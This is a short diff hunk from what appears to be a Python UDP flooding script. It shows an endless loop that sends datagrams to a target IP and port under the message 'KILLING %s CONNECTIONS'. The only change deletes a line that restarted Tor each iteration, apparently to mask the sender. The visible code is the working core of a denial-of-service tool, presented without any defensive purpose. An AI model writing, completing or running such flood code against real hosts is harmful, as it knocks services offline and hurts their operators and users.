@@ -104,7 +104,6 @@ warning : type warning says something important
 		print "KILLING %s CONNECTIONS"%(ip)						
 		while True:
 			os.system("clear")
-			os.system("service tor restart")
 			os.system("clear")
 			sock.sendto(Gb, (ip,port))
 			sock.sendto(bytes, (ip,port))
